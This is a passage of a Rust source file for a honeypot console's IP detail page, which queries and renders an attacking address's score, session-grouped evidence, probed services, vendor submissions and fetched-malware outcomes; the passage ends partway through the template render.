@@ -1,0 +1,2416 @@
+//! `GET /ip/:ip` - the IP detail page (`internal/design/06-console-observability.md`, "Pages" >
+//! "IP detail"). Session-gated: mounted under the `protected` group in `routes::mod`.
+//!
+//! Six read-only queries, all scoped to the one path-param IP:
+//! - the score summary via `core_scoring::read_score` (decayed to now, same as `routes::queue`)
+//!   plus `core_scoring::effective_score` for the breadth-adjusted number the blocklist
+//!   recommendation gate actually uses;
+//! - the evidence timeline: the last 200 `event` rows for this IP, newest first, grouped in Rust
+//!   into per-connection session cards (`session_id`) with an "Ungrouped events" tail for rows
+//!   that predate session tracking (`internal/design/11-console-forensics.md`, "Detail page:
+//!   payload visibility and session grouping");
+//! - the per-WAN breakdown: `event` rows GROUP BY `wan_ip` - internal-only attribution the
+//!   operator sees here but that never reaches the feed or a vendor report (this design's own
+//!   "Per-WAN attribution is internal-only");
+//! - the category breakdown, derived from the already-fetched `IpScore.category_breakdown` (no
+//!   extra query - it is the same JSON `routes::queue`'s `live_categories` reads, just kept as
+//!   weight/confidence values here instead of collapsed to a category list);
+//! - the submission history: `vendor_submission` rows for this IP.
+//! - malware fetched from this IP's URLs: `fetch_attempt` rows whose `source_ip` is this IP,
+//!   LEFT JOINed against `sample_analysis` on the captured payload's sha256, so the "attacker src"
+//!   / "download URL" / "VT-scanned sample" that today read as three unrelated things share one
+//!   panel (`fetch_malware_rows`'s doc comment covers the type-mismatched join and the
+//!   first-reporter-only attribution caveat this carries).
+//! - every URL this IP told a shell to fetch, with what became of it: `honeypot_file_download`
+//!   events joined to `fetch_attempt` by URL rather than by reporter, so a URL another address
+//!   reported first (and whose capture the panel above therefore never shows) is still linked to
+//!   its existing result, dated, or shown as failed (with the reason) or unsupported
+//!   (`fetch_url_rows`).
+//!
+//! An IP with no `ip_score` row renders 404, matching the design's "Error handling": "Missing IP
+//! ... returns 404." That is a normal, expected outcome (an operator following a stale link, or
+//! guessing an IP), not a database/template failure, so it is handled directly rather than
+//! through `AppError` (whose every variant renders a generic 503 - see that module's doc
+//! comment): a 404 here says something true and specific, a 503 would not.
+//!
+//! Chart (sub-project 6, console-charts, task 4): a per-IP event timeline, one more Chart.js chart
+//! fed by `Chart` (the global `routes::dashboard`'s templates already load). Its query is
+//! supplementary rather than core content - same soft-fail policy `routes::dashboard`'s own doc
+//! comment establishes for its charts ("a slow or errored chart query degrades to an empty
+//! chart... never a 503"), unlike this module's other four queries, which all hard-fail via `?`:
+//! an IP whose score/evidence/WAN/submission data cannot be read is a broken page, but one whose
+//! timeline query hiccups is still a perfectly usable detail page minus one chart. `generate_series`
+//! zero-fills every bucket unconditionally, so - like the dashboard's own main timeline - the
+//! chart always renders, never gated behind an empty-state check. Defaults to a 7-day daily-bucket
+//! window (`detail`); `chart_fragment` (console-forensics task 4) serves the same series at an
+//! operator-adjustable range ("24h"/"7d"/"30d") as an HTMX fragment the range-selector buttons swap
+//! into `#detail-chart-container`, never re-rendering the whole page for a range change.
+//!
+//! Evidence timeline pagination (console-forensics task 4): `detail` renders only the first
+//! `EVIDENCE_PAGE_SIZE` rows; `events_fragment` serves subsequent pages via a `(observed_at, id)`
+//! keyset cursor - a plain `OFFSET` would re-scan and re-sort every prior page on each request and
+//! silently skip or duplicate rows if new events land between page loads, both avoided by keying on
+//! the last row actually rendered. The "Load more" button's response replaces itself (an HTMX
+//! out-of-band swap on `#load-more-container`) with either a fresh button carrying the next cursor
+//! or nothing, while the new rows themselves land via a normal `beforeend` swap into
+//! `#evidence-timeline` - see `templates/events_fragment.html`.
+
+use std::collections::BTreeMap;
+use std::net::IpAddr;
+
+use axum::extract::{Path, Query, State};
+use axum::http::{HeaderMap, StatusCode};
+use axum::response::{Html, IntoResponse, Response};
+use axum::routing::get;
+use axum::{Extension, Router};
+use chrono::{DateTime, NaiveDate, SecondsFormat, Utc};
+use core_scoring::{
+    Category, Protocol, SignalType, effective_score, persistence_points, read_score,
+};
+use minijinja::context;
+use rust_decimal::Decimal;
+use rust_decimal::prelude::ToPrimitive;
+use serde::{Deserialize, Serialize};
+use sqlx::{PgPool, Row};
+
+use crate::AppState;
+use crate::auth::Session;
+use crate::routes::attack::{self, TagChip};
+use crate::routes::campaigns::{campaigns_by_ip, indexer_progress};
+use crate::routes::context::{BaseContext, base_context};
+use crate::routes::degraded::Degraded;
+use crate::routes::error::AppError;
+use crate::routes::format::{
+    format_activity, format_bytes, format_relative_time, format_sensor_label, format_timestamp,
+    protocol_label, tier_label,
+};
+use crate::templates::script_json;
+
+pub fn router() -> Router<AppState> {
+    Router::new()
+        .route("/ip/{ip}", get(detail))
+        .route("/ip/{ip}/events", get(events_fragment))
+        .route("/ip/{ip}/chart", get(chart_fragment))
+}
+
+/// Both `detail`'s initial page load and `events_fragment`'s subsequent pages fetch at most this
+/// many rows per query; a page coming back exactly this size is the "there may be more" signal
+/// (`fetch_evidence_rows`'s doc comment) - there is no separate `COUNT(*)` query.
+const EVIDENCE_PAGE_SIZE: i64 = 200;
+
+/// Row cap for the "Malware fetched from this IP's URLs" panel's `fetch_malware_rows` query -
+/// generous relative to how many distinct download URLs a single attacker realistically reports
+/// (unlike the evidence timeline, there is no "Load more" for this panel).
+const MALWARE_PAGE_SIZE: i64 = 50;
+
+/// One `event` row as rendered in a session card's body (or the "Ungrouped events" table for
+/// pre-`session_id` rows). `activity` and `detail` are both pre-formatted display strings; the
+/// fields below `session_id` never reach the template (`#[serde(skip)]`) - they exist purely so
+/// [`group_into_sessions`] can derive session-level summaries (start time, duration, credential
+/// used, command count) without re-parsing `metadata_json` or re-deriving the snake_case signal
+/// type from `activity`'s human label.
+#[derive(Debug, Serialize)]
+struct EventRow {
+    id: i64,
+    observed_at: String,
+    relative_time: String,
+    activity: String,
+    detail: String,
+    /// Pre-formatted `0xNN` badge, set when the command was recovered from a single-byte-XOR
+    /// obfuscation; drives a small "de-obfuscated (xor 0xNN)" badge in the timeline. `None` for a
+    /// plaintext command (minijinja has no hex filter, so this is formatted here).
+    xor_badge: Option<String>,
+    /// The command's lines when it had a line break (`metadata.command_lines`, which sensors write
+    /// only then); empty for a single-line command and for events recorded before the key existed,
+    /// which show the collapsed `detail` as before.
+    lines: Vec<String>,
+    /// More lines were sent than the sensor kept (`metadata.command_lines_truncated`).
+    lines_truncated: bool,
+    /// What the shell answered to this command, from the `shell_output` row named by
+    /// `metadata.output_sha256`. `None` when the event names none (every other event, and every
+    /// command recorded before replies were kept) or when no row is stored for it.
+    reply: Option<ReplyView>,
+    /// What the review fetcher did with the URL a `honeypot_file_download` event named; `None` for
+    /// every other event and for a download event that carries no `url` (see
+    /// [`attach_fetch_outcomes`]).
+    fetch: Option<FetchOutcome>,
+    protocol: String,
+    authenticated: bool,
+    wan_ip: String,
+    metadata_json: String,
+    session_id: Option<String>,
+    #[serde(skip)]
+    raw_observed_at: DateTime<Utc>,
+    #[serde(skip)]
+    sensor_raw: String,
+    #[serde(skip)]
+    signal_type_raw: String,
+    #[serde(skip)]
+    metadata: serde_json::Value,
+}
+
+/// What the evidence timeline's first page holds, by unit, for its header. The header used to say
+/// "N events" alone, which read as the address's total (the stat above counts scored events) or as
+/// its commands; it is the number of ledger rows on the page.
+#[derive(Debug, PartialEq, Serialize)]
+struct TimelineCounts {
+    /// Ledger rows on the page.
+    events: usize,
+    /// Of those, `honeypot_command_exec` rows.
+    commands: usize,
+    /// Distinct `session_id`s among them.
+    sessions: usize,
+    /// Rows with no `session_id` (they predate session tracking).
+    ungrouped: usize,
+}
+
+impl TimelineCounts {
+    fn of(events: &[EventRow]) -> Self {
+        let sessions: std::collections::BTreeSet<&str> = events
+            .iter()
+            .filter_map(|e| e.session_id.as_deref())
+            .collect();
+        Self {
+            events: events.len(),
+            commands: events
+                .iter()
+                .filter(|e| e.signal_type_raw == "honeypot_command_exec")
+                .count(),
+            sessions: sessions.len(),
+            ungrouped: events.iter().filter(|e| e.session_id.is_none()).count(),
+        }
+    }
+}
+
+/// One collapsible session card: every `EventRow` sharing a non-null `session_id`, in
+/// chronological (oldest-first) order, plus the summary [`group_into_sessions`] derives from
+/// them for the card header.
+#[derive(Debug, Serialize)]
+struct SessionGroup {
+    session_id: String,
+    start_time: String,
+    start_relative: String,
+    duration: String,
+    sensor: String,
+    protocol: String,
+    username: String,
+    command_count: usize,
+    event_count: usize,
+    events: Vec<EventRow>,
+    /// How the card's table lists `events`: one row per event, except that a run of echo-loader
+    /// chunk writes to one file is one row ([`timeline_items`]).
+    items: Vec<TimelineItem>,
+    expanded: bool,
+    /// The ATT&CK techniques tagged in this session, as chips in the card header; empty when it
+    /// has none (see [`attach_session_tags`]).
+    tags: Vec<TagChip>,
+    /// The latest `observed_at` in the group. Not rendered by the template (there's no "session end" field in the card header - `duration` already conveys
+    /// the span) - it exists purely as [`group_into_sessions`]'s sort key, per the design spec's
+    /// "Order sessions by most recent first (latest `observed_at` in each group)": sorting on
+    /// `start_time` instead would put a still-ongoing long session behind a short session that
+    /// started later but both started and ended after it.
+    #[serde(skip)]
+    end_time: DateTime<Utc>,
+    /// The session's commands in order: what [`fold_repeated_sessions`] compares.
+    #[serde(skip)]
+    commands: Vec<String>,
+}
+
+/// One row of a session card: `events[start..end]` of its session. A single event unless
+/// `chunk_file` is set, in which case the range is a run of consecutive command lines that each
+/// wrote one echo-loader chunk to that file (the sensor's `assembled_file`/`chunk_index` keys).
+#[derive(Debug, Serialize)]
+struct TimelineItem {
+    start: usize,
+    end: usize,
+    chunk_file: Option<String>,
+    first_chunk: u64,
+    last_chunk: u64,
+}
+
+/// Consecutive sessions from one sensor that ran the same command sequence, newest first: a
+/// retry loop re-running one script shows as one card with a count instead of a card per retry.
+#[derive(Debug, Serialize)]
+struct SessionFold {
+    sessions: Vec<SessionGroup>,
+    repeat: usize,
+    /// The distinct usernames the sessions logged in with, in first-seen order.
+    users: Vec<String>,
+    /// The oldest session's start, and how long ago the newest one started.
+    first_start: String,
+    latest_relative: String,
+    sensor: String,
+    protocol: String,
+    command_count: usize,
+    expanded: bool,
+}
+
+#[derive(Debug, Serialize)]
+struct WanRow {
+    wan_ip: String,
+    event_count: i64,
+    has_authenticated: bool,
+}
+
+#[derive(Debug, Serialize)]
+struct CategoryRow {
+    category: String,
+    weight: String,
+    max_confidence: String,
+}
+
+#[derive(Debug, Serialize)]
+struct SubmissionRow {
+    submitted_at: String,
+    vendor: String,
+    categories: String,
+    response_status: String,
+    success: bool,
+}
+
+/// One row of the "Services probed" panel: this IP's activity against a single sensor, i.e. which
+/// of our services it actually touched and whether it ever authenticated there. The honeypot-native
+/// counterpart to a Shodan "services" view - what the attacker did to us, not what it exposes.
+#[derive(Debug, Serialize)]
+struct ServiceRow {
+    /// Human label for the sensor, e.g. `VNC (5900)`; falls back to the raw sensor name.
+    service: String,
+    sensor: String,
+    event_count: i64,
+    authenticated: bool,
+    first_seen: String,
+    last_seen: String,
+}
+
+/// One `fetch_attempt` row for this IP, LEFT JOINed against `sample_analysis` on the captured
+/// payload's sha256 - the "Malware fetched from this IP's URLs" panel
+/// (`fetch_malware_rows`'s doc comment covers the join and its first-reporter-only caveat).
+/// `sha256`/`sha256_short`/`detected`/`total`/`vt_link`/`analyzed_at` are all `None` for a fetch
+/// that never captured a body (a rejected/dead/timed-out attempt), or that captured one but has
+/// not been VirusTotal-scanned yet - `status` still renders in both cases, since a failed or
+/// pending fetch is evidence too.
+#[derive(Debug, Serialize)]
+struct MalwareRow {
+    /// "uploaded" (the address handed the body to a sensor - a first-party observation) or
+    /// "fetched" (the fetcher retrieved a url this address reported - first-reporter only).
+    origin: String,
+    url: String,
+    host: String,
+    pinned_ip: Option<String>,
+    /// Raw `fetch_attempt.status` value (pending/success/dead/rejected/too_big/timeout/empty -
+    /// `review::fetcher::FetchStatus::as_str()`, same vocabulary `routes::samples` displays).
+    status: String,
+    /// Why a shell capture stopped, in words, when every event behind this row agrees on one
+    /// reason and none is missing it - see `fetch_malware_rows` for why a disagreeing or
+    /// partly-absent group shows nothing rather than picking one. `None` for a fetched row, for
+    /// captures recorded before sensors emitted the field, and for protocols whose completeness
+    /// comes from a protocol-defined end of file rather than from how the session ended.
+    end_reason: Option<String>,
+    /// Pre-formatted byte count (`format_bytes`), `None` when no body was captured.
+    bytes: Option<String>,
+    /// Full lowercase-hex sha256, for the title attribute; `None` when no body was captured.
+    sha256: Option<String>,
+    /// First 12 hex chars of `sha256`, for the table cell.
+    sha256_short: Option<String>,
+    detected: Option<i32>,
+    total: Option<i32>,
+    vt_link: Option<String>,
+    analyzed_at: Option<String>,
+}
+
+/// One URL this IP asked a shell to fetch, with the fetcher's outcome for that URL whoever
+/// reported it first - see `fetch_url_rows`.
+#[derive(Debug, Serialize)]
+struct UrlRow {
+    url: String,
+    /// How many `honeypot_file_download` events from this IP named the URL, and when.
+    seen_count: i64,
+    first_seen: String,
+    last_seen: String,
+    /// `captured`, `failed`, `pending`, `unsupported` or `unqueued`: drives the pill style.
+    kind: String,
+    /// The outcome as text, dated where a fetch happened.
+    outcome: String,
+    /// The address whose report queued the URL, when it was not this one, and when.
+    first_reporter: Option<String>,
+    queued_at: Option<String>,
+    bytes: Option<String>,
+    sha256: Option<String>,
+    sha256_short: Option<String>,
+    detected: Option<i32>,
+    total: Option<i32>,
+    vt_link: Option<String>,
+}
+
+/// The review fetcher's record of one URL, as [`classify_fetch`] reads it. Absent (`None` at the
+/// call sites) when the fetcher has no row for the URL.
+struct FetchRecord {
+    status: String,
+    reject_reason: Option<String>,
+    attempts: i32,
+    last_attempt: DateTime<Utc>,
+    sha256_hex: Option<String>,
+    bytes: Option<i32>,
+}
+
+/// The longest fetcher reason shown on the timeline. A reason can quote an error string from the
+/// attacker's server, so it is capped here and auto-escaped by the template like every value.
+const FETCH_REASON_MAX_CHARS: usize = 160;
+
+/// A `fetch_attempt` outcome as the timeline renders it beside a download event.
+#[derive(Debug, PartialEq, Serialize)]
+struct FetchOutcome {
+    /// `captured`, `refused`, `failed`, `pending`, `unsupported` or `unqueued`: drives the style.
+    kind: &'static str,
+    /// The outcome in words, without the reason.
+    label: String,
+    /// Why, when the fetcher recorded it (or, for an unsupported URL, which scheme).
+    reason: Option<String>,
+    /// When the last attempt happened; absent when none did.
+    when: Option<String>,
+    /// The captured sample, linked to its page; set only for `captured`.
+    sample: Option<SampleLink>,
+    bytes: Option<String>,
+}
+
+#[derive(Debug, PartialEq, Serialize)]
+struct SampleLink {
+    sha256: String,
+    short: String,
+}
+
+/// Classifies the fetcher's record of `url` (`None`: no row). Shared by the URL panel and the
+/// evidence timeline so the two cannot disagree about what happened to a URL.
+///
+/// `refused` is the SSRF guard (or the hop limit) turning an attempt away; every other non-success
+/// is `failed`. A row that exhausted its retries is `dead` whatever the last attempt's cause was,
+/// so a refusal that hit the cap reads as a failure that gave up; the reason it carries is the
+/// last attempt's.
+fn classify_fetch(url: &str, record: Option<&FetchRecord>) -> (&'static str, String) {
+    let Some(r) = record else {
+        return if review::fetcher::store::parse_url_parts(url).is_some() {
+            ("unqueued", "not queued".to_string())
+        } else {
+            let scheme = url.split("://").next().unwrap_or("").to_ascii_lowercase();
+            ("unsupported", format!("unsupported scheme ({scheme})"))
+        };
+    };
+    let attempted = format_timestamp(r.last_attempt);
+    match r.status.as_str() {
+        "success" => ("captured", format!("captured {attempted}")),
+        "pending" => ("pending", format!("pending ({} attempts)", r.attempts)),
+        other => {
+            let reason = r
+                .reject_reason
+                .as_deref()
+                .map(|reason| format!(": {reason}"))
+                .unwrap_or_default();
+            let kind = if other == "rejected" {
+                "refused"
+            } else {
+                "failed"
+            };
+            (kind, format!("{other}{reason} {attempted}"))
+        }
+    }
+}
+
+/// The timeline's view of [`classify_fetch`]: the same classification, as a label, a reason and a
+/// link to the captured sample rather than one sentence.
+fn fetch_outcome(url: &str, record: Option<&FetchRecord>) -> FetchOutcome {
+    let (kind, _) = classify_fetch(url, record);
+    let reason = record
+        .and_then(|r| r.reject_reason.as_deref())
+        .map(|r| r.chars().take(FETCH_REASON_MAX_CHARS).collect::<String>())
+        .filter(|r| !r.is_empty());
+    let when = record.map(|r| format_timestamp(r.last_attempt));
+    let label = match (kind, record) {
+        ("captured", _) => "fetched".to_string(),
+        ("refused", _) => "refused".to_string(),
+        ("pending", Some(r)) => format!("pending, {} attempts so far", r.attempts),
+        ("failed", Some(r)) => match r.status.as_str() {
+            "dead" => format!("gave up after {} attempts", r.attempts),
+            "timeout" => "failed: timed out, will retry".to_string(),
+            "too_big" => "failed: too big, will retry".to_string(),
+            "empty" => "failed: empty body, will retry".to_string(),
+            other => format!("failed: {other}"),
+        },
+        ("unsupported", _) => "not fetched".to_string(),
+        _ => "not queued".to_string(),
+    };
+    let reason = match kind {
+        "unsupported" => Some(
+            url.split("://")
+                .next()
+                .map(|s| format!("unsupported scheme ({})", s.to_ascii_lowercase()))
+                .unwrap_or_default(),
+        ),
+        "captured" | "unqueued" => None,
+        _ => reason,
+    };
+    let (sample, bytes) = match (kind, record) {
+        ("captured", Some(r)) => (
+            r.sha256_hex.as_ref().map(|s| SampleLink {
+                sha256: s.clone(),
+                short: s.chars().take(12).collect(),
+            }),
+            r.bytes.map(|b| format_bytes(b.max(0) as u64)),
+        ),
+        _ => (None, None),
+    };
+    FetchOutcome {
+        kind,
+        label,
+        reason,
+        when: if kind == "unsupported" || kind == "unqueued" {
+            None
+        } else {
+            when
+        },
+        sample,
+        bytes,
+    }
+}
+
+/// Sets [`SessionGroup::tags`] for every session that ran a command (only a shell session carries
+/// tags), from one query. A page holds at most [`EVIDENCE_PAGE_SIZE`] events, so the id list is
+/// bounded by that. A failed lookup leaves the cards without chips.
+async fn attach_session_tags(
+    db: &PgPool,
+    sessions: &mut [SessionGroup],
+) -> Result<(), sqlx::Error> {
+    let ids: Vec<String> = sessions
+        .iter()
+        .filter(|s| s.command_count > 0)
+        .map(|s| s.session_id.clone())
+        .collect();
+    let mut tags = review::attack::session_tags(db, &ids).await?;
+    for session in sessions.iter_mut() {
+        if let Some(found) = tags.remove(&session.session_id) {
+            session.tags = attack::chips(&found);
+        }
+    }
+    Ok(())
+}
+
+/// A command's reply as the timeline shows it, folded under the command.
+#[derive(Debug, Serialize)]
+struct ReplyView {
+    /// "reply, 9000 B, first 4096 B shown": the summary of the fold.
+    label: String,
+    /// Attacker-influenced; the template escapes it like every other value.
+    text: String,
+}
+
+/// The digest `metadata.output_sha256` names, when the event names one.
+fn output_sha(event: &EventRow) -> Option<&str> {
+    event.metadata.get("output_sha256")?.as_str()
+}
+
+/// Sets [`EventRow::reply`] on every event whose metadata names a stored reply, from one query.
+async fn attach_replies(db: &PgPool, events: &mut [EventRow]) -> Result<(), sqlx::Error> {
+    let shas: Vec<String> = events
+        .iter()
+        .filter_map(output_sha)
+        .map(str::to_string)
+        .collect();
+    if shas.is_empty() {
+        return Ok(());
+    }
+    let stored = core_scoring::read_outputs(db, &shas).await?;
+    for event in events.iter_mut() {
+        let Some(text) = output_sha(event).and_then(|sha| stored.get(sha)) else {
+            continue;
+        };
+        let len = event
+            .metadata
+            .get("output_len")
+            .and_then(|v| v.as_u64())
+            .unwrap_or(text.len() as u64);
+        let cut = event
+            .metadata
+            .get("output_truncated")
+            .and_then(|v| v.as_bool())
+            .unwrap_or(false);
+        let label = if cut {
+            format!("reply, {len} B, first {} B shown", text.len())
+        } else {
+            format!("reply, {len} B")
+        };
+        event.reply = Some(ReplyView {
+            label,
+            text: text.clone(),
+        });
+    }
+    Ok(())
+}
+
+/// The lines of a multi-line command, from `metadata.command_lines`. Only strings are taken, and a
+/// value of any other shape yields no lines (the page then shows the collapsed command).
+fn command_lines(metadata: &serde_json::Value) -> Vec<String> {
+    metadata
+        .get("command_lines")
+        .and_then(|v| v.as_array())
+        .map(|a| {
+            a.iter()
+                .filter_map(|l| l.as_str().map(str::to_string))
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+/// The trimmed `url` a download event names, when it names one.
+fn download_url(event: &EventRow) -> Option<&str> {
+    if event.signal_type_raw != "honeypot_file_download" {
+        return None;
+    }
+    let url = event.metadata.get("url")?.as_str()?.trim();
+    (!url.is_empty()).then_some(url)
+}
+
+/// Sets [`EventRow::fetch`] on every download event in `events`, from one query keyed by the
+/// fetcher's own `url_hash` (`review::fetcher::store::url_hash`), so the match is the fetcher's
+/// own equivalence class and not a re-spelling of it. The outcome is the URL's current record,
+/// whoever reported it first: a later attacker's download shows the capture the URL already
+/// produced, dated.
+async fn attach_fetch_outcomes(db: &PgPool, events: &mut [EventRow]) -> Result<(), sqlx::Error> {
+    let hashes: Vec<Vec<u8>> = events
+        .iter()
+        .filter_map(download_url)
+        .map(review::fetcher::store::url_hash)
+        .collect();
+    if hashes.is_empty() {
+        return Ok(());
+    }
+    let rows = sqlx::query(
+        "SELECT url_hash, status, reject_reason, attempts, last_attempt, bytes, \
+                encode(sha256, 'hex') AS sha256_hex \
+         FROM fetch_attempt WHERE url_hash = ANY($1)",
+    )
+    .bind(&hashes)
+    .fetch_all(db)
+    .await?;
+    let mut records: BTreeMap<Vec<u8>, FetchRecord> = BTreeMap::new();
+    for row in rows {
+        records.insert(
+            row.try_get("url_hash")?,
+            FetchRecord {
+                status: row.try_get("status")?,
+                reject_reason: row.try_get("reject_reason")?,
+                attempts: row.try_get("attempts")?,
+                last_attempt: row.try_get("last_attempt")?,
+                sha256_hex: row.try_get("sha256_hex")?,
+                bytes: row.try_get("bytes")?,
+            },
+        );
+    }
+    for event in events.iter_mut() {
+        let Some(url) = download_url(event) else {
+            continue;
+        };
+        let outcome = fetch_outcome(url, records.get(&review::fetcher::store::url_hash(url)));
+        event.fetch = Some(outcome);
+    }
+    Ok(())
+}
+
+/// An operator-initiated external lookup link. The operator's browser makes the request, never the
+/// honeypot, so the box never leaks which addresses it has captured (egress-free enrichment).
+#[derive(Debug, Serialize)]
+struct ExternalLink {
+    name: String,
+    url: String,
+}
+
+/// Mirrors the JSON shape of `core_scoring::scoring::engine::CategoryStat` (crate-private there -
+/// see `queue.rs`'s `live_categories` for the same deserialize-a-local-shape approach applied to
+/// just the category keys).
+#[derive(Debug, Deserialize)]
+struct CategoryStatView {
+    weight: Decimal,
+    max_confidence: Decimal,
+}
+
+async fn detail(
+    State(state): State<AppState>,
+    Extension(session): Extension<Session>,
+    headers: HeaderMap,
+    Query(query): Query<DetailQuery>,
+    Path(ip): Path<IpAddr>,
+) -> Result<Response, AppError> {
+    // Drawer mode: the evidence drawer's `hx-get="/ip/{ip}?drawer=1"` request. Rendered only for a
+    // genuine HTMX request (the `HX-Request` header) so a person navigating straight to
+    // `/ip/{ip}?drawer=1` still gets the full, chrome-wrapped page - the drawer is a JS enhancement
+    // over that real page, never a separate destination. `is_drawer` swaps detail.html's parent to
+    // the bare `drawer_shell.html`, so the same template renders into the slide-over.
+    let is_drawer = query.drawer.is_some() && headers.contains_key("HX-Request");
+    let layout = if is_drawer {
+        "drawer_shell.html"
+    } else {
+        "base.html"
+    };
+
+    let Some(score) = read_score(&state.db, ip).await? else {
+        return Ok((StatusCode::NOT_FOUND, not_found_body(ip)).into_response());
+    };
+
+    let effective = effective_score(score.raw_score, score.distinct_wan_count as u32);
+    let raw_f64 = score.raw_score.to_f64().unwrap_or(0.0);
+    let effective_f64 = effective.to_f64().unwrap_or(0.0);
+
+    let mut degraded = Degraded::new();
+    let mut all_events = fetch_evidence_rows(&state.db, ip, None).await?;
+    // Supplementary: a failed lookup leaves the timeline without outcome lines and names the panel
+    // in the banner, rather than rendering "no outcome" as if the fetcher had recorded none.
+    degraded.soft(
+        "download outcomes",
+        attach_fetch_outcomes(&state.db, &mut all_events).await,
+    );
+    degraded.soft(
+        "command replies",
+        attach_replies(&state.db, &mut all_events).await,
+    );
+    let timeline_counts = TimelineCounts::of(&all_events);
+    let has_more_events = all_events.len() as i64 == EVIDENCE_PAGE_SIZE;
+    let next_cursor = all_events
+        .last()
+        .map(|e| format_cursor(e.raw_observed_at, e.id));
+    let (mut sessions, ungrouped) = core_scoring::off_worker(|| group_into_sessions(all_events, 3));
+    degraded.soft(
+        "session techniques",
+        attach_session_tags(&state.db, &mut sessions).await,
+    );
+    let session_folds = core_scoring::off_worker(|| fold_repeated_sessions(sessions));
+
+    let wan_rows = sqlx::query(
+        "SELECT host(wan_ip) AS wan_ip, COUNT(*) AS event_count, \
+                bool_or(protocol = 'tcp' AND authenticated) AS has_authenticated \
+         FROM event WHERE source_ip = $1::inet AND wan_ip IS NOT NULL \
+         GROUP BY wan_ip ORDER BY event_count DESC",
+    )
+    .bind(ip.to_string())
+    .fetch_all(&state.db)
+    .await?;
+    let mut per_wan = Vec::with_capacity(wan_rows.len());
+    for row in wan_rows {
+        per_wan.push(WanRow {
+            wan_ip: row.try_get("wan_ip")?,
+            event_count: row.try_get("event_count")?,
+            has_authenticated: row
+                .try_get::<Option<bool>, _>("has_authenticated")?
+                .unwrap_or(false),
+        });
+    }
+
+    let categories = category_rows(&score.category_breakdown);
+
+    let submission_rows = sqlx::query(
+        "SELECT vendor, categories, submitted_at, response_status, success \
+         FROM vendor_submission WHERE source_ip = $1::inet ORDER BY submitted_at DESC",
+    )
+    .bind(ip.to_string())
+    .fetch_all(&state.db)
+    .await?;
+    let mut submissions = Vec::with_capacity(submission_rows.len());
+    for row in submission_rows {
+        let submitted_at: DateTime<Utc> = row.try_get("submitted_at")?;
+        let categories: Vec<String> = row.try_get("categories")?;
+        let response_status: Option<i32> = row.try_get("response_status")?;
+        submissions.push(SubmissionRow {
+            submitted_at: format_timestamp(submitted_at),
+            vendor: row.try_get("vendor")?,
+            categories: categories.join(", "),
+            response_status: response_status
+                .map(|s| s.to_string())
+                .unwrap_or_else(|| "-".to_string()),
+            success: row.try_get("success")?,
+        });
+    }
+
+    // "Services probed": this IP's activity grouped by sensor - which of our services it touched,
+    // how often, whether it ever authenticated, and the window. Unlike the per-WAN query this does
+    // not filter on wan_ip, so it is populated even while WAN attribution is unconfigured.
+    let service_rows = sqlx::query(
+        "SELECT sensor, COUNT(*) AS event_count, bool_or(authenticated) AS any_auth, \
+                min(observed_at) AS first_seen, max(observed_at) AS last_seen \
+         FROM event WHERE source_ip = $1::inet \
+         GROUP BY sensor ORDER BY event_count DESC, sensor ASC",
+    )
+    .bind(ip.to_string())
+    .fetch_all(&state.db)
+    .await?;
+    let mut services = Vec::with_capacity(service_rows.len());
+    for row in service_rows {
+        let sensor: String = row.try_get("sensor")?;
+        let first: DateTime<Utc> = row.try_get("first_seen")?;
+        let last: DateTime<Utc> = row.try_get("last_seen")?;
+        services.push(ServiceRow {
+            service: service_label(&sensor),
+            sensor,
+            event_count: row.try_get("event_count")?,
+            authenticated: row.try_get::<Option<bool>, _>("any_auth")?.unwrap_or(false),
+            first_seen: format_timestamp(first),
+            last_seen: format_timestamp(last),
+        });
+    }
+
+    let malware = fetch_malware_rows(&state.db, ip).await?;
+    let urls = fetch_url_rows(&state.db, ip).await?;
+    let via_other_reporters = samples_via_other_reporters(&malware, &urls);
+
+    let external_links = external_lookup_links(ip);
+
+    // Offline geo/ASN enrichment (egress-free). `None` when no GeoLite2 database is configured, so
+    // the template renders the "not configured" placeholder; `Some` (possibly with empty fields)
+    // once the operator drops the databases into `PROPOLIS_GEOIP_DIR`.
+    let geo = state.geoip.lookup(ip);
+
+    // Opt-in forward-confirmed reverse DNS - the one outbound lookup in this page. Run the blocking
+    // system-resolver call off the async worker with a short timeout; `None` (disabled, timed out, or
+    // join error) hides the row, so a slow resolver degrades the page by one field, never blocks it.
+    let rdns = if state.rdns.is_enabled() {
+        let resolver = state.rdns.clone();
+        let handle = tokio::task::spawn_blocking(move || resolver.lookup(ip));
+        tokio::time::timeout(std::time::Duration::from_secs(3), handle)
+            .await
+            .ok()
+            .and_then(Result::ok)
+            .flatten()
+    } else {
+        None
+    };
+
+    // Default range: 7 daily buckets, oldest to newest, zero-filled where a day had no events for
+    // this IP - always exactly 7 rows (the `generate_series` bound is unconditional), matching
+    // the dashboard's own always-populated hourly timeline. Supplementary: soft-fails to an empty
+    // chart rather than the whole page, per the module doc comment. `chart_fragment` (below) reuses
+    // the same helper for the adjustable-range HTMX endpoint the "24h/7d/30d" buttons hit.
+    let (ip_timeline_labels, ip_timeline_data) = degraded.soft(
+        "activity timeline",
+        detail_daily_series(&state.db, ip, 6).await,
+    );
+    let current_range = "7d";
+    let campaigns = degraded
+        .soft(
+            "campaigns",
+            campaigns_by_ip(&state.db, &[ip.to_string()]).await,
+        )
+        .remove(&ip.to_string())
+        .unwrap_or_default();
+    let (indexed, newest) = degraded.soft(
+        "campaign indexer progress",
+        indexer_progress(&state.db).await,
+    );
+    let techniques = attack::techniques(
+        degraded
+            .soft(
+                "ATT&CK techniques",
+                review::attack::source_tags(&state.db, &[ip.to_string()]).await,
+            )
+            .remove(&ip.to_string())
+            .unwrap_or_default(),
+    );
+
+    let csrf_token = state
+        .sessions
+        .generate_csrf(&session.id)
+        .unwrap_or_default();
+    let BaseContext {
+        pending_count,
+        uptime,
+        version,
+        degraded: base_degraded,
+    } = base_context(&state.db, state.startup_time, state.version).await;
+    degraded.absorb(base_degraded);
+    let degraded = degraded.names();
+
+    // Shadowed into their JSON-string form right before the template needs them - see
+    // `routes::dashboard`'s doc comment for why a string (rendered with `|safe`) rather than a
+    // native minijinja list.
+    let ip_timeline_labels = script_json(&ip_timeline_labels);
+    let ip_timeline_data = script_json(&ip_timeline_data);
+
+    let tmpl = state.templates.get_template("detail.html")?;
+    // The session cards embed every row's raw JSON, so the render is off the async workers.
+    let html = core_scoring::off_worker(|| {
+        tmpl.render(context! {
+            layout,
+            is_drawer,
+            csrf_token,
+            active_nav => "detail",
+            pending_count,
+            uptime,
+            version,
+            degraded,
+            ip => ip.to_string(),
